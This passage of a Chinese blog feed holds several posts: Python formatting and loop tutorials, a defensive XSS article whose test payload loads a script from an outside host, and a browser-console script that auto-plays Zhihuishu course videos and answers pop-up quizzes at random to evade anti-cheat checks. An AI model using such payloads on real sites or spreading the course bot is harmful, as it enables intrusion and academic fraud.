class="hljs-string">&quot;MySQL&quot;</span>,<span class="hljs-string">&quot;Python&quot;</span>\]</span><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;My name is &#123;0\[0\]&#125; , I love &#123;0\[1\]&#125; !&quot;</span>.format(stu)</span></span>)<br><br>My name is opcai , I love linux !<br></code></pre></td></tr></table></figure><h1 id="数字格式化"><a href="#数字格式化" class="headerlink" title="数字格式化"></a>数字格式化</h1><p>|数字        |格式    |输出        |描述                            |<br>|3.1415926    |{:.2f}    |3.14        |保留小数点后两位                |<br>|3.1415926    |{:+.2f}|+3.14        |带符号保留小数点后两位            |<br>|-1            |{:+.2f}|-1.00        |带符号保留小数点后两位            |<br>|2.71828    |{:.0f}    |3            |不带小数                        |<br>|5            |{:0&gt;2d}|05            |数字补零 (填充左边, 宽度为2)    |<br>|5            |{:x&lt;4d}|5xxx        |数字补x (填充右边, 宽度为4)    |<br>|10            |{:x&lt;4d}|10xx        |数字补x (填充右边, 宽度为4)    |<br>|1000000    |{:,}    |1,000,000    |以逗号分隔的数字格式            |<br>|0.25        |{:.2%}    |25.00%        |百分比格式                        |<br>|1000000000    |{:.2e}    |1.00e+09    |指数记法                        |<br>|13            |{:10d}    |13            |右对齐 (默认, 宽度为10)        |<br>|13            |{:&lt;10d}|13            |左对齐 (宽度为10)                |<br>|13            |{:^10d}|13            |中间对齐 (宽度为10)            |</p><h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><p>|数字    |格式                |输出    |描述        |<br>|11        |’{:b}’.format(11)    |1011    |二进制        |<br>|11        |’{:d}’.format(11)    |11        |十进制        |<br>|11        |’{:o}’.format(11)    |13        |八进制        |<br>|11        |’{:x}’.format(11)    |b        |十六进制    |<br>|11        |’{:#x}’.format(11)    |0xb    |十六进制    |<br>|11        |’{:#X}’.format(11)    |0XB    |十六进制    |</p><p>*^, &lt;, &gt; 分别是居中、左对齐、右对齐，后面带宽度， : 号后面带填充的字符，只能是一个字符，不指定则默认是用空格填充。</p><ul><li>表示在正数前显示 +，负数前显示 -； （空格）表示在正数前加空格</li></ul><p>b、d、o、x 分别是二进制、十进制、八进制、十六进制。*</p><h1 id="输出大括号"><a href="#输出大括号" class="headerlink" title="输出大括号"></a>输出大括号</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;&#123;&#125; &#123;&#123;0&#125;&#125;&quot;</span>.format(<span class="hljs-string">&quot;opcai\_linux&quot;</span>)</span></span>)<br><br>opcai\_linux &#123;<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><p>原文链接：<a href="https://segmentfault.com/a/1190000022049917">https://segmentfault.com/a/1190000022049917</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前端安全之 xss 攻击</title>
    <link href="/2020/03/20.html"/>
    <url>/2020/03/20.html</url>
    
    <content type="html"><![CDATA[<h1 id="什么是-xss？"><a href="#什么是-xss？" class="headerlink" title="什么是 xss？"></a>什么是 xss？</h1><p>XSS 攻击指通过巧妙的方法注入恶意指令代码到网页，使<strong>用户加载并执行</strong>攻击者恶意制造的代码。</p><h1 id="危害有什么？"><a href="#危害有什么？" class="headerlink" title="危害有什么？"></a>危害有什么？</h1><p>1.跳转到广告页面，页面注入广告等等。<br>2.导致公司域名被其他平台拉黑，从而使业务受损。<br>3.用户的财产受到威胁，他注入的代码可以在网页中任意请求接口。</p><a id="more"></a><h1 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://upcdn&quot;&#x27;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//www.lilnong.top/xss.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(12306)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>\n\t\n<br></code></pre></td></tr></table></figure><p>上面的代码是我们测试的时候使用的，接下来我们来分析一下这个代码主要用途。<br>1.<code>http://upcdn</code> 这个字符串是用来伪装的。</p><ul><li><code>&lt;img src=&quot;$&#123;str&#125;&quot;&gt;</code> 动态拼接图片地址</li><li><code>&lt;a href=&quot;$&#123;str&#125;&quot;&gt;</code> 动态跳转页面地址</li></ul><p>2.<code>&quot;&#39;&gt;</code> 这两个就是为了截断当前字符串，然后闭合标签。</p><ul><li><code>&lt;img src=&quot;$&#123;str&#125;&quot;&gt;</code></li></ul><p>3.<code>&lt;/script&gt;</code> 也是为了闭合标签，这个主要用在后台模板输出的时候。后台模板 velocity、freemarker 之类的。</p><ul><li><code>&lt;script&gt;var imgUrl = $&#123;str&#125;&lt;/script&gt;</code></li></ul><p>4.<code>&lt;script src=&quot;//www.lilnong.top/xss.js&quot;&gt;&lt;/script&gt;</code> 就是引入一个js，这种方式比较常见。注入之后，攻击者只需要修改自己的文件，就可以更新了。<br>5.<code>&lt;script&gt;alert(12306)&lt;/script&gt;</code> 直接执行js代码<br>6.<code>&lt;svg&gt;&lt;/svg&gt;</code> 注入一个元素，用于展示一个异常块打乱布局。比如 <code>vue</code> 中的 <code>v-html</code> 不会执行 <code>script</code> 标签中的内容，但是会显示 <code>svg</code> 图片。<br>7.<code>\n\t\n</code> 是为了测试后台模板输出的场景。</p><h1 id="防护场景及方案"><a href="#防护场景及方案" class="headerlink" title="防护场景及方案"></a>防护场景及方案</h1><h2 id="后台模板"><a href="#后台模板" class="headerlink" title="后台模板"></a>后台模板</h2><p>1.<code>toHtml</code> 主要用于输出在页面（标签中）中，将用户输入的内容进行编码比如 <code>&lt;</code>转换为<code>&amp;lt;</code>。</p><ul><li><span>${nickanme}</span></li></ul><p>2.<code>toJS</code> 主要用于输出在script标签中，这里需要防止打断js，比如处理成<code>&quot;&#39;\</code>n为<code>\&quot;\&#39;\\n</code><br>3.<code>toUrl</code> 这里其实和 <code>toHtml</code> 场景很像，但是需要判断url基础格式。</p><ul><li><code>https://</code></li><li><code>//lilnong.top</code></li><li><code>/static</code></li><li><code>./static</code></li><li><code>../static</code></li></ul><h2 id="jquery-amp-原生js"><a href="#jquery-amp-原生js" class="headerlink" title="jquery&amp;原生js"></a>jquery&amp;原生js</h2><p>1.toHtml 场景。jquery中基本上都是拼接一下，然后 <code>.html</code> 输出一下。这里需要做的也是把用户输入的做一下实体编码转换。<br>2.toUrl 场景。校验一下url，然后 <code>toHtml</code> 或者 <code>encode</code> 都可以。</p><h2 id="vue"><a href="#vue" class="headerlink" title="vue"></a>vue</h2><p>1.toHtml 场景。<code>v-html</code> 这里需要注意一下，尽可能不要使用，因为会导致注入问题。也可以toHtml一下，但是没必要不是吗。<br>2.toUrl 场景。<code>:href </code>主要 <code>javascript:alert(1);</code>这种场景，做url校验就可以。<br>3.toHtml 场景。使用原生的方法，vue 中非要 <code>innerHTML</code>的那些人。</p><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><h2 id="富文本场景"><a href="#富文本场景" class="headerlink" title="富文本场景"></a>富文本场景</h2><p>1.做文章那种，大量的标签，属性。这种一般需要后端处理。<code>HTML Purifier</code><br>2.文字加表情，后者搜索高亮的场景。这种我们可以先执行<code>toHtml</code>，然后再匹配替换，最后在输出到页面即可。</p><h2 id="换行符问题"><a href="#换行符问题" class="headerlink" title="换行符问题"></a>换行符问题</h2><p>有时我们在<code>textarea</code>中输入<code>\n</code>，渲染的时候空白符就被浏览器给吃了。针对这种情况，我们可以用下面的方案处理</p><p>1.通过 css 属性 <code>white-space</code>，或者 <code>&lt;pre&gt;</code> 标签<br>2.一般人们是正则替换<code>.replace(/\n/g,&#39;&lt;br&gt;)</code>，这种输出的时候万一里面有代码不就凉了吗。所以我们先 toHtml 然后在使用，这样可以防止注入问题。<br>3.其实 <code>.innerText</code> 可以自动把<code>\n</code>转换为<code>&lt;br&gt;</code>，你可以自己试试</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-built_in">window</span>.base = &#123;<br>    <span class="hljs-attribute">toHtml</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">val</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">typeof</span> val != <span class="hljs-string">&#x27;string&#x27;</span> ) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">var</span> entityMap = &#123;<br>            <span class="hljs-string">&quot;&amp;&quot;</span>: <span class="hljs-string">&quot;&amp;amp;&quot;</span>,<br>            <span class="hljs-string">&quot;&lt;&quot;</span>: <span class="hljs-string">&quot;&amp;lt;&quot;</span>,<br>            <span class="hljs-string">&quot;&gt;&quot;</span>: <span class="hljs-string">&quot;&amp;gt;&quot;</span>,<br>            <span class="hljs-string">&#x27;&quot;&#x27;</span>: <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>,<br>            <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&#x27;&amp;#39;&#x27;</span>,<br>            <span class="hljs-string">&quot;/&quot;</span>: <span class="hljs-string">&#x27;&amp;#x2F;&#x27;</span><br>        &#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">String</span>(val).replace(<span class="hljs-regexp">/[&amp;&lt;&gt;&quot;&#x27;\/]/g</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">s</span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> entityMap[s];<br>        &#125;);<br>    &#125;,<br>    <span class="hljs-attribute">toUrl</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">url</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">typeof</span> <span class="hljs-built_in">url</span> != <span class="hljs-string">&#x27;string&#x27;</span> ) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;#&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">url</span>.match(<span class="hljs-regexp">/^http/i</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">encodeURI</span>(<span class="hljs-built_in">url</span>)<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;#&#x27;</span><br>    &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>原文链接：<a href="https://segmentfault.com/a/1190000022014580">https://segmentfault.com/a/1190000022014580</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>智慧树刷课代码</title>
    <link href="/2020/03/19.html"/>
    <url>/2020/03/19.html</url>
    
    <content type="html"><![CDATA[<p>功能： 检测章节  自动静音  自动下一节  1.5倍速<br>而且重要的一点就是，跳出来的问题，会随机作答，而不是全部选第一个。<br>代码来源网络。<br>使用方法： 打开正在看的视频 按F12打开控制台，找到Console那一栏，直接粘贴此处代码 按回车就好了。</p><a id="more"></a><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> chapters_length = <span class="hljs-built_in">document</span>.querySelectorAll(<span class="hljs-string">&quot;ul.list&quot;</span>).length;<br><span class="hljs-keyword">var</span> video_length = <span class="hljs-built_in">document</span>.querySelectorAll(<span class="hljs-string">&quot;li.video&quot;</span>).length;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;共检测到&quot;</span> + chapters_length + <span class="hljs-string">&quot;章&quot;</span> + video_length + <span class="hljs-string">&quot;小节!&quot;</span>);<br><span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;volumeIcon&quot;</span>)[<span class="hljs-number">0</span>].click(); <span class="hljs-comment">//设置静音</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;静音设置成功!&quot;</span>);<br><span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;speedTab speedTab15&quot;</span>)[<span class="hljs-number">0</span>].click(); <span class="hljs-comment">//设置1.5倍速</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;1.5倍播放&quot;</span>);<br><span class="hljs-comment">//每两秒检测进度是否100%</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> progress = <span class="hljs-built_in">window</span>.getComputedStyle(<span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;passTime&quot;</span>)[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>).width; <span class="hljs-comment">//进度数据</span><br>    <span class="hljs-keyword">if</span> (progress == <span class="hljs-string">&quot;100%&quot;</span>) &#123;<br>        <span class="hljs-comment">//下一节</span><br>        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;nextBtn&quot;</span>).click();<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;自动播放下一节&quot;</span>);<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>            <span class="hljs-comment">//检测00:00:00状态 处理章节间跳动</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&quot;span.duration&quot;</span>).innerHTML == <span class="hljs-string">&quot;00:00:00&quot;</span>) &#123;<br>                <span class="hljs-keyword">var</span> finished_length = <span class="hljs-built_in">document</span>.querySelectorAll(<span class="hljs-string">&quot;b.time_icofinish&quot;</span>).length;<br>                <span class="hljs-built_in">document</span>.querySelectorAll(<span class="hljs-string">&quot;li.video&quot;</span>)[finished_length].click();<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;进入下一章节!&quot;</span>);<br>            &#125;<br>        &#125;, <span class="hljs-number">2000</span>);<br>    &#125;<br>&#125;, <span class="hljs-number">2000</span>);<br><span class="hljs-comment">//每秒检测弹窗</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">//防静音意外失效</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;volumeBox  volumeNone&quot;</span>)[<span class="hljs-number">0</span>])<br>    &#123;<br>        <span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;volumeIcon&quot;</span>)[<span class="hljs-number">0</span>].click();<br>        <span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;speedTab speedTab15&quot;</span>)[<span class="hljs-number">0</span>].click(); <span class="hljs-comment">//设置1.5倍速</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;dialog-test&quot;</span>)[<span class="hljs-number">0</span>]) &#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;检测到弹窗!&quot;</span>);<br>        <span class="hljs-keyword">var</span> random_number = randomNum(<span class="hljs-number">0</span>, <span class="hljs-built_in">document</span>.querySelectorAll(<span class="hljs-string">&quot;li.topic-item&quot;</span>).length - <span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;topic-item&quot;</span>)[random_number].click(); <span class="hljs-comment">//随机选一个防作弊</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;已选择第&quot;</span> + (random_number + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;个选项&quot;</span>);<br>        <span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;el-dialog__wrapper dialog-test&quot;</span>)[<span class="hljs-number">0</span>].getElementsByClassName(<br>            <span class="hljs-string">&quot;el-dialog__footer&quot;</span>)[<span class="hljs-number">0</span>].getElementsByClassName(<span class="hljs-string">&quot;btn&quot;</span>)[<span class="hljs-number">0</span>].click(); <span class="hljs-comment">//关闭弹窗</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;弹窗关闭!&quot;</span>);<br>        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;playButton&quot;</span>).click(); <span class="hljs-comment">//播放</span><br>    &#125;<br>&#125;, <span class="hljs-number">1000</span>);<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randomNum</span>(<span class="hljs-params">minNum, maxNum</span>) </span>&#123;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-built_in">arguments</span>.length) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>(<span class="hljs-built_in">Math</span>.random() * minNum + <span class="hljs-number">1</span>, <span class="hljs-number">10</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>(<span class="hljs-built_in">Math</span>.random() * (maxNum - minNum + <span class="hljs-number">1</span>) + minNum, <span class="hljs-number">10</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python中for和while循环的区别及用法</title>
    <link href="/2020/03/18.html"/>
    <url>/2020/03/18.html</url>
    
    <content type="html"><![CDATA[<h1 id="两者的区别"><a href="#两者的区别" class="headerlink" title="两者的区别"></a>两者的区别</h1><p>1,使用场景不同：<br><code>知道执行次数</code>的时候一般用<code>for</code>，<code>条件循环</code>时一般用<code>while</code>。</p><p>2,两种循环在构造死循环时的区别：<br>while循环里的条件被看成<code>表达式</code>，因此，当用while构造死循环时，里面的<code>TRUE</code>实际上被看成永远为真的表达式，这种情况容易产生混淆，有些工具软件如PC-Lint就会认为出错了，因此构造死循环时，最好使用for(;;)来进行。</p><a id="more"></a><p>3,两种循环在普通循环时的区别：<br>对一个数组进行循环时，一般来说，如果每轮循环都是在循环处理完后才讲循环变量增加的话，使用<code>for</code>循环比较方便。<br>如果循环处理的过程中就要将循环变量增加时，则使用<code>while</code>循环比较方便。<br>还有在使用<code>for</code>循环语句时，如果里面的循环条件很长，可以考虑用<code>while</code>循环进行替代，使代码的排版格式好看一些。</p><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p><code>for</code>循环可以<code>设置次数</code>，<code>while</code>循环条件满足<code>没有次数限制</code>。<br><img src="https://s2.ax1x.com/2020/03/07/3XZIH0.png" srcset="/img/loading.gif" lazyload alt="1"></p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习之路（四）</title>
    <link href="/2020/03/17.html"/>
    <url>/2020/03/17.html</url>
    
    <content type="html"><![CDATA[<h1 id="神奇的小海龟"><a href="#神奇的小海龟" class="headerlink" title="神奇的小海龟"></a>神奇的小海龟</h1><h2 id="和小海龟做朋友"><a href="#和小海龟做朋友" class="headerlink" title="和小海龟做朋友"></a>和小海龟做朋友</h2><ul><li>Python中的<code>turtle</code>模块是一个简单的画图工具。它在屏幕上提供一 个小海龟，这只小海龟可以在屏幕上爬来爬去，并在爬过的地方 留下五颜六色的痕迹</li><li>使用<code>import turtle</code>命令即可导入小海龟的功能模块<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-meta">#引入画笔工具</span><br><span class="hljs-keyword">import</span> turtle<br><br></code></pre></td></tr></table></figure><a id="more"></a><h2 id="小海龟的常见命令"><a href="#小海龟的常见命令" class="headerlink" title="小海龟的常见命令:"></a>小海龟的常见命令:</h2><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>设置海龟的外形</td><td><code>turtle.shape()</code></td></tr><tr><td>设置痕迹的颜色</td><td><code>turtle.color()</code></td></tr><tr><td>海龟向前移动</td><td><code>turtle.forward()</code>或者<code>turtle.fd()</code></td></tr><tr><td>海龟向后移动</td><td><code>turtle.backward()</code>或者<code>turtle.bk()</code></td></tr><tr><td>海龟向左转</td><td><code>turtle.left()</code>或者<code>turtle.lt()</code></td></tr><tr><td>海龟向右转</td><td><code>turtle.right()</code>或者<code>turtle.rt()</code></td></tr><tr><td>让海龟离开屏幕（此时海龟爬过 的地方不留痕迹）</td><td><code>turtle.up()</code></td></tr><tr><td>让海龟回到屏幕</td><td><code>turtle.down()</code></td></tr><tr><td>设置海龟爬行的速度</td><td><code>turtle.speed()</code></td></tr><tr><td>让海龟画圆</td><td><code>turtle.circle()</code></td></tr><tr><td>开始填充</td><td><code>turtle.begin_fill()</code></td></tr><tr><td>结束填充</td><td><code>turtle.end_fill()</code></td></tr></tbody></table></li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">turtle</span><br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.speed</span>(<span class="hljs-number">0</span>)<br> <br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.shape</span>(<span class="hljs-string">&quot;turtle&quot;</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.color</span>(<span class="hljs-string">&quot;red&quot;</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.left</span>(<span class="hljs-number">90</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.forward</span>(<span class="hljs-number">200</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.right</span>(<span class="hljs-number">90</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.forward</span>(<span class="hljs-number">200</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.right</span>(<span class="hljs-number">90</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.forward</span>(<span class="hljs-number">200</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.right</span>(<span class="hljs-number">90</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.forward</span>(<span class="hljs-number">200</span>)<br> <br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.begin_fill</span>()<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.circle</span>(<span class="hljs-number">100</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.end_fill</span>()<br></code></pre></td></tr></table></figure><h1 id="用小海龟画正多边形"><a href="#用小海龟画正多边形" class="headerlink" title="用小海龟画正多边形"></a>用小海龟画正多边形</h1><ul><li>计算机给我们提供了一种将代码中相同部分重复执行的有效方法， 这种方法叫做循环</li><li>for循环是Python循环的一种，其语法格式为： </li><li><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">for 循环变量 in 循环变量取值范围</span>: <br>      需要循环的程序代码<br></code></pre></td></tr></table></figure></li><li>在<code>for</code>循环中，紧跟<code>for</code>语句的变量<code>i</code>被称之为循环变量，该变量的 值在循环的过程中会不断地变化，它的变化受限于关键字<code>in</code>之后 的内容</li><li>在<code>for</code>语句之后被循环执行的语句块我们称之为循环体，即真正被 循环执行的部分，我们在循环体前方添加一个缩进（4个空格） 来表示它们之间的所属关系<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">turtle</span><br> <br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.shape</span>(<span class="hljs-string">&quot;turtle&quot;</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.color</span>(<span class="hljs-string">&quot;red&quot;</span>)<br><span class="hljs-selector-id">#for</span>循环开始<br><span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-attr">[0,1,2,3,4]</span>:<br>    <span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.right</span>(<span class="hljs-number">144</span>)<br>    <span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.forward</span>(<span class="hljs-number">200</span>)<br><span class="hljs-selector-id">#for</span>循环结束<br></code></pre></td></tr></table></figure><h1 id="用函数化简程序"><a href="#用函数化简程序" class="headerlink" title="用函数化简程序"></a>用函数化简程序</h1></li><li><code>函数</code>：使用一个名字定义一段实现特定功能的代码组合的工作机 制，使用该函数的名字，即可让计算机执行函数内预先定义好的 程序</li><li>函数定义的语法格式：</li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> 函数名(<span class="hljs-params">参数列表</span>):</span> <br>       函数体<br></code></pre></td></tr></table></figure></li><li>程序的函数必须是<code>先定义再调用</code>的<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs less">#请进小海龟，并设置小海龟的外形和颜色<br><span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">turtle</span><br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.shape</span>(<span class="hljs-string">&quot;turtle&quot;</span>)<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.color</span>(<span class="hljs-string">&quot;red&quot;</span>)<br>#定义函数并设置参数（<span class="hljs-selector-tag">x</span>,<span class="hljs-selector-tag">y</span>,<span class="hljs-selector-tag">color</span>)<br><span class="hljs-selector-tag">def</span> <span 